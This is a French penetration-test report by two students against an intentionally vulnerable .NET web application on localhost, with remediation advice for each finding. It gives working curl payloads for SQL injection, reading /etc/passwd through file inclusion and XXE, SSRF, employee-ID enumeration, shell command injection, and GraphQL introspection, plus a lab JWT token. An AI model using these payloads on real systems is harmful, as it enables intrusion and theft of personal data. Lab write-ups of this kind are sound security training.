Gérard Galmar / Yassine Abdaoui

Pour repérer les vulnérabilités dans l'application, on a utilisé Snyk, pour réaliser une analyse du code source. Ce qui nous a permis de repérer plusieurs failles critiques.

Mais d'un point de vue plus réaliste, on a décidé de privilégier l'éxploitation des vulnérabilités via des requêtes curl, pour tenter de simuler un scénario black box, où on ne dispose d'aucune informations.
L'étape de la reconnaissance ( faite grâce à plusieurs outils, tels que dirb, ffuf, scripts pythons... ) était donc primordiale pour tenter de trouver des vulnérabilités, et les éxploiter par la suite.

---> Reconnaissance <----

Dirb, ffuf

irb https://localhost:3000 /usr/share/wordlists/seclists/Fuzzing/fuzz-Bo0oM.txt -w -H "Authorization: Bearer (Token Here)"

---> /login

---> /swagger

---> /swagger/index.html

---> /swagger/v1/swagger.json

dirb https://localhost:3000 /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -w -H "Authorization: Bearer (Token Here)"

---> /login

---> /client

---> /contract

---> /employee

---> /invoice

---> /patch


ffuf -u https://localhost:3000/?FUZZ=test  -H 'Content-Type: application/json' -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt --mc 299,301,302,307,401,403,405,500 -H "Authorization: Bearer (Token Here)"
---> paramètre lang trouvé

Un script résumant toutes les actions entreprises a également été fait en bash afin de structurer notre travail.
Vous pourrez utiliser ce script afin de voir plus clairement comment on s'est organisé pour réaliser cette opération.

###  1 SQL injection (CWE-89)

Comme c'est une page simple de login, on sait déjà du premier coup d'oeil, qu'on doit tenter une injection sql.

En curl, on tente en premier lieu de voir quel champ est injectable :

curl -ik https://localhost:3000/login \
  -H "Content-Type: application/json" \
  -d '{"username": "re", "password": "'\''"}'

Par chance, le serveur nous retourne une réponse intéréssante : 

---> at VulnerableWebApplication.VLAIdentity.VLAIdentity.VulnerableQuery(String User, String Passwd)

On connait donc, grâce à cette mauvaise gestion des erreurs, le nom des champs, qui sont "User" et "Passwd".

On retente donc ensuite de voir quel champ est injectable, avec les bons champs :

--> curl -ik https://localhost:3000/login \
  -H "Content-Type: application/json" \
  -d '{"user": "'rr'", "passwd": "'\''"}'

Comme le champ passwd n'est pas injectable :

curl -ik https://localhost:3000/login \
  -H "Content-Type: application/json" \
  -d '{"username": "'\''", "password": ""}'

On découvre maintenant que le champ user est injectable

On trouve ensuite le nom des colonnes encore grâce aux erreurs indiquées : 

curl -ik https://localhost:3000/login \
  -H "Content-Type: application/json" \
  -d '{"user": "'\''OR username LIKE '\''crocks", "passwd": "re"}'
  
  ---> System.Data.EvaluateException: Cannot find column [username]
  
  On cherche ensuite le nom des colonnes encore grâce aux erreurs indiquées, et on trouve finalement user & passwd.

  On récupère ensuite un token d'authentification grâce à une requête réussie.
  
curl -ik https://localhost:3000/login \
  -H "Content-Type: application/json" \
  -d '{"user": "'\''OR user LIKE '\''e%", "passwd": "re"}'

Comme nous n'avons pas réussi à utiliser hydra, on a réalisé un script réalisé en python, et on a pu bruteforce la table user, afin de trouver un maximum de noms d'utilisateurs.
Concernant les mots de passe, ils sont probablement stockés sous forme de hash, il fallait donc trouver un moyen de dump la base de donnée, ou retenter un brute force avec la liste des bons utilisateurs, sur le champ password.

###  2. Exposure of Sensitive Information to an Unauthorized Actor (CWE-200)

### Commentaire :

A partir du paramètre trouvé (?lang=test) grâce à l'étape de la reconnaissance ( dirb ), on trouve que ?lang=test donne un code 200, ce qui nous amène par la suite à tenter de trouver une vulnérabilité évidente (LFI); on le voit dès la première érreur mentionnée en lançant notre requête: "Could not find file".

Le fait ici qu'on puisse accéder à /etc/passwd, avec un token d'authentification non admin, nous démontre clairement qu'un utilisateur lambda peut accéder à ces informations très sensibles.

Requête pour récupérer le contenu /etc/passwd :

---> curl -k "https://localhost:3000/?lang=/etc/passwd" -H "Authorization:bearer (TokenHere)"

La requête ici fonctionne éxeptionnellement avec des "/" pour ce genre de répertoires, je suppose que c'est parcequ'on peut accéder à /etc/passwd depuis n'importequel path, ce qui fait que ça bypass le fait que ces caractères soient interdits.




###  3-4. Deserialization of Untrusted Data (CWE-502) + Code injection (CWE-94)

Ici, on commence d'abord par éxécuter une commande curl simple, sur l'url https://localhost:3000/invoice/, et on constate rapidement qu'on obtient erreur 405 ( method not allowed ).

On passe donc à la méthod POST, et on obtient un nouveau code : 400, avec une nouvelle erreur : Implicit body inferred for parameter "request" but no body was provided.
On sait désormais qu'on va devoir entrer de la donnée ( -d ) afin de tenter de trouver une vulnérabilité.

En continuant l'éxploration, on passe à une erreur 415, on ajoute donc le content-type, et en forçant, on retourne sur une erreur 400, qui correspond à une bad request, on décide donc de partir sur un dirb pour énumérer de potentiels paramètres qui permettraient de réussir une requête.

On chosiit une seclist appropriée ( du web content discovery, donc burp-parameter-names.txt )

Commande curl :

ffuf -u https://localhost:3000/invoice -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -H 'Content-Type: application/json' -H "Authorization: Bearer ( Token Here )" -d '{"FUZZ":"test"}' --mc 400 -fw 1 

Ici, le code 400 est spéficiée par le paramètre --mc ( match code ) car ffuf propose une liste de code générique, qui ne contient pas certains codes de base, comme le code 400.
Le -fw sert à filtrer selon le nombre de mots dans la réponse ( mots différent de 1 ).

On trouve par la suite deux paramètres intéréssants qui ressortent : price & qty, et en réécutant une commande curl, on remarque une erreur : The JSON value could not be converted to System.Int32.
Le serveur s'attend à recevoir une donnée de type INT, on comprend que c'est grâce à cette erreur qu'on a pu retrouver ces deux paramètres à l'aide de dirb.

Par manque d'éxperience, cette vulnérabilité n'a pas pu être éxploitée jusqu'au bout.

Recommandations : Ne pas utiliser JsonConvert.DeserializeObject sur des données provenant de l’utilisateur sans validation stricte du format ( et du type ) attendu.


###  5. XML Injection (CWE-91)


Concernant l'injection XML, on a pu identifier l'url /contract qui retournait des erreurs liées à xml, lorsqu'on tentait de rentrer une valeur aléatoire au paramètre i.
Après quelques tests, on a donc constaté que l'url acceptait une chaîne XML en paramètre.

En éxécutant des requêtes contenant du xml, et en testant donc une balise simple ( <name>test</name> ), on a pu confirmer la vulnérabilité de l'injection XML, car le serveur retournait bien "test".

La requête curl ( on traduit toujours ici en ascii, pour éviter les problèmes de cmdlet )
---> curl -k https://localhost:3000/contract?i=%3Cname%3Etest%3C%2Fname%3E -H "Authorization: Bearer (Token Here)

L'injection peut être poussée bien plus loin, en injectant des balises supplémentaires, des champs à trouver avec dirb par exemple, comme isadmin, ou tenter de provoquer des erreurs de logique....

Recommandations : Désactiver le traitement des DTD, utiliser des parseurs XML sécurisés... ---> XmlReader avec DtdProcessing.Prohibit


###  6. Utilisation de secrets codés en dur (CWE-798)


On a pu trouver cette vulnérabilité à partir de deux autres, injection sql pour trouver un token d'authentification ( qui correspondraient à un user admin dans un cas réel ) , et de la vulnérabilité LFI.
Une fois qu'on a découvert la vulnérabilité LFI, on n'est pas censé connaître le nom des fichiers, on doit donc utiliser dirb afin d'en trouver un maximum.

Certains outils éxistent déjà pour faire de l'énumération, mais dans un cas comme ça, et comme il faut une certaine éxpertise dedans pour rajouter le token nécéssaire, inclure du path traversal dans un outil, ce qui nous a semblé plutôt compliqué en premier lieu, on a décidé de faire un script python qui s'en occuperait.

On a donc utilisé la fameuse seclist umbraco-cms-all-levels.txt, qui était une wordlist appropriée pour découvrir les types de fichiers de cette application ( .json, .cs ... )
On peut également utiliser une wordlist et y ajouter nous même les éxtensions que le script va tester ( .php, .json, .cs ... ) afin d'en profiter un maximum, et en y ajoutant biensûr du path traversal.

On découvre ensuite le secret JWT, codé en dur, dans appsettings.json, qui nous a par la suite, permis de créer des tokens admin valides.

NB : On a également tenté nous même de trouver nous même le secret avec différents outils ( jwt.tool ), à partir d'un token valide non admin venant de l'injection sql.

Recommandations : Ne jamais stocker de secrets en dur dans le code source, ou dans des fichiers accessibles publiquement. 
Utiliser par exemple des gestionnaires de secrets sécurisés ( HashiCorp Vault, AWS Secrets Manager...)


###  7-8. SSRF (CWE-94) + XXE Injection (CWE-611)


#### 7. XXE (XML External Entity)

Explication : Le parseur XML peut traiter des entités externes définies dans l’input, ce qui permettrait à un attaquant d’accéder à des fichiers locaux ou de provoquer des requêtes vers des ressources internes.

Recommandation pour les développeurs : Désactivez la résolution des entités externes dans XmlReaderSettings (DtdProcessing = Prohibit) et évitez les DTD dans les données XML entrantes.

Ici on éxécute des requêtes curl sur la page /Contract, et on se rend rapidement compte que le serveur nous répond "System.Xml.XmlException" ainsi que plusieurs erreurs, montrant déjà que le serveur s'attend à recevoir du xml, donc potentiellement une vulnérabilité xxe éxploitable.

Puisque le serveur s'attend à recevoir du xml, on lui envoie ensuite quelques requêtes curl contenant du xml ( traduit en ascii car les caractères spéciaux sont interprétés en tant que cmdlet linux ), et on se rend rapidement compte que le parser xml est mal configuré car on peut facilement accéder à des fichiers locaux.

Requête pour récupérer le contenu de etc/passwd :

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>

Traduite en ascii, ce qui donne : 

curl -k https://localhost:3000/Contract?i=%3C%3Fxml%20version%3D%221.0%22%20encoding%3D%22UTF-8%22%3F%3E%20%3C%21DOCTYPE%20foo%20%5B%20%3C%21ENTITY%20xxe%20SYSTEM%20%22file%3A%2F%2F%2Fetc%2Fpasswd%22%3E%20%5D%3E%20%3CstockCheck%3E%3CproductId%3E%26xxe%3B%3C%2FproductId%3E%3C%2FstockCheck%3E -H "Authorization: Bearer (TokenHere)"

Nous récupérons donc bien par la suite le contenu de etc/passwd, en appellant l'entité file.


### 8. Server-Side Request Forgery (SSRF) (CWE-918) // Indirectement : URL Injection (CWE-601)


- **Snyk :** Une requête HTTP est effectuée en fonction d’une URL potentiellement contrôlée par l'utilisateur.  
- **Explication :** Bien que l’URL soit filtrée pour s'assurer qu’elle commence par `https://localhost`, cette vérification reste fragile face à certaines techniques de contournement.  
- **Recommandation pour les développeurs :** Utiliser une liste blanche d’hôtes autorisés ou une validation stricte sur le format complet de l’URL, y compris IP, port et domaine.

Le contenu xml :

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "http://127.0.0.1:8000/test.txt">
]>
<contract>
    <name>&xxe;</name>
</contract>

Traduit ensuite pour l'inclure dans une requête curl : 

curl -k https://localhost:3000/contract?i=%3C%21DOCTYPE%20foo%20%5B%20%3C%21ENTITY%20xxe%20SYSTEM%20%22http%3A%2F%2F127.0.0.1%3A8000%2Ftest.txt%22%3E%20%5D%3E%20%3Ccontract%3E%3Cname%3E%26xxe%3B%3C%2Fname%3E%3C%2Fcontract%3E -H "Authorization: Bearer (Token Here )"

L'exemple ici n'est pas totalement représentatif de ce que peut réellement faire une ssrf.
Avec cette méthode, qui contourne souvent les protections ( car les droits sont segmentés de base ) on peut tenter d'accéder à des services internes...

Recommendations : Valider et filtrer les url fournies par l'utilisateur, désactiver les fonctionnalités du parser XML (XmlResolver ) pour empêcher les appels réseau inités via des entités éxternes ( XXE --> SSRF )


###  9-10. Local File Intrusion (CWE-829) // Path Traversal (CWE-22)


-Explications : Un utilisateur peut manipuler le paramètre "lang" pour accéder à des fichiers système ou sensibles.

à partir du paramètre trouvé (?lang=test) grâce à l'étape de la reconnaissance ( dirb ), on trouve que ?lang=test donne un code 200, ce qui nous amène par la suite à tenter de trouver une vulnérabilité (LFI), et un path traversal par la suite; on le voit dès la première érreur mentionnée en lançant notre requête: "Could not find file".

à partir de là, on peut récupérer le contenu de certains fichiers présents dans le répertoire actuel, en cherchant bien sûr, des wordlist contenant des noms probables de fichiers ( en rajoutant également des éxtensions .json, .txt ...)

pour notre part, on a réalisé un script qui s'occupe de trouver des fichiers potentiellement éxistants, et qui fait également du path traversal, pour trouver un maximum de fichiers possible.

Requête pour récupérer le contenu /etc/passwd :

---> curl -k "https://localhost:3000/?lang=/etc/passwd" -H "Authorization:bearer (TokenHere)"

La requête fonctionne avec lang=/etc/passwd, mais si on a des soucis par la suite pour faire du path traversal ( le code qui interdit certains caractères ), on peut utiliser les caractères ascii : 

---> curl -k "https://localhost:3000/?lang=%2fetc%2fpasswd -H "Authorization:bearer (TokenHere)"

Recommandation : Utiliser une liste blanche de fichiers autorisés plutôt qu'une blacklist, bloquer toute les types de séquences, ne pas inclure directement des chemins ou noms de fichiers fournis par l'utilisateur sans validation, et configurer les permissions pour qu'en cas de faille, les fichiers ne soient pas lisibles par l'application.


###  11. Insecure Direct Object Reference (IDOR) (CWE-639)


Explications : Le paramètre "Id" est utilisé directement pour retrouver un utilisateur sans vérification d’autorisation. ça permet donc à un utilisateur malveillant d'accéder à des données d'autres employés en changeant l'ID dans la requête.  

Sur la page /employee, en tentant une valeur au hasard sur le paramètre i ( ?i=1 ), on constate qu'on récupère des données confidentielles, qui contiennent même les adresses 
on a donc plus qu'à créer une liste de nombres de 0 à 2 000 par exemple, ( seq 0 2000 > list.txt ) et d'utiliser dirb afin de trouver un maximum d'informations confidentielles.

---> dirb https://localhost:3000/employee?i= list.txt -H "TokenHere"

ou à défaut, utiliser seclist, mais ça aurait moins d'interêt que de créer soit même une petite liste de nombres avec seq.

---> dirb https://localhost:3000/employee?i= /usr/share/wordlists/seclists/Fuzzing/4-digits-0000-9999.txt -H "TokenHere"
On découvre ensuite des données confidentielles d'une quinzaine d'employés.

Recommandations : Implémenter une logique d’autorisation stricte basée sur l’utilisateur connecté, et vérifier que l’ID demandé lui appartient.


###  12. Command Injection (CWE-77)


- Explications: Le paramètre `UserStr` est utilisé pour construire une commande shell sans échappement. Un attaquant pourrait donc injecter une commande arbitraire après l'appel "nslookup", conduisant à l'éxécution de commandes systèmes non prévues.
  
La page concernée ici est localdnsresolver, l'url n'a cependant pas encore pu être trouvée en utilisant des wordlist ( à l'étape de la reconnaissance ), mais a pu être observée à plusieurs reprises dans des fichiers de logs.

Elle peut être éxploitée car l’application ne filtre pas correctement les entrées utilisateurs. 

Après avoir tenté un dirb pour trouver un paramètre valide, on comprend que la requête s'attend à recevoir une entrée sous forme de domaine, et on trouve une vulnérabilité éxploitable en ajourant un séparateur ";", ce qui nous permet par la suite d'injecter des commandes.

---> curl -k "https://localhost:3000/localdnsresolver?i=www.support.com;id" -H "Authorization: Bearer (TokenHere)

Recommandation : Ne jamais insérer de chaînes utilisateur dans une commande shell ( never trust user ). Utiliser des API sécurisées pour DNS, ou échapper correctement les arguments.


###  13. GraphQL (CWE-200)


- Explications: L’interface GraphQL est exposée publiquement. ça permet donc à un attaquant d'éxplorer toute l'API GraphQL.

En éxploitant la page client, on trouve GraphQL, et avec des requêtes curl, on arrive à trouver les tables accessibles
On peut donc éxécuter une query par curl pour récupérer tous les champs disponibles : 

---> curl -k -X POST https://localhost:3000/client \
  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJJZCI6InVzZXIiLCJJc0FkbWluIjoiRmFsc2UiLCJuYmYiOjE3MjUyNjY1MDksImV4cCI6MTc1NjgwMjUwOSwiaWF0IjoxNzI1MjY2NTA5fQ.D_RUjJiR4eptm1DJqpPEOYMEbP6fFWgRX7ylZIFHtSE" \
  -H "Content-Type: application/json" \
  -H "GraphQL-Require-Preflight: 1" \
  -d '{"query":"{ __schema { types { name fields { name } } } }"}'

La requête ci-dessous est découpée avec des backslash pour faire plus propre, et ne pas tout écrire sur une seule ligne.

---> curl -k -X POST https://localhost:3000/client \
  -H "Authorization: Bearer (TokenHere)" \
  -H "Content-Type: application/json" \
  -H "GraphQL-Require-Preflight: 1" \ 
  -d '{"query":"{clientsByBank(bank:1){id name bank}}"}'

  On récupère ici des données confidentielles sur les employés ( prénoms, banques, iban... ) 

  Il éxiste une query pour récupérer tous les champs disponibles :

 ---> Burp suite :
 
{
  "query": "{ __schema { queryType { name } types { name fields { name } } } }"
}

{

  "query": "{ clientsByBank(bank :1) { id name bank} }"

}
 
Dans un scénario élaboré, on aurait peut être pu entrevoir la possibilité d'une csrf, en admettant qu'on connaisse le noms de leurs banques, qu'on sache que la victime est connectée à sa banque en ligne, l'url du virement, que la protection CSRF soit assez faible...
Mais le message "CSRF_PROTECTION" en réponse, lors de l'éxploitation de la vulnérabilité, nous laisse croire qu'une protection a été prévue pour.

Recommandations : Restreindre les requêtes du genre "__schema", qui permettent d'éxplorer toute l'api, filtrer les champs éxposés selon les rôles, sanitiser les entrées utilisateurs, protection anti CSRF ( graphql-require-prelight ).
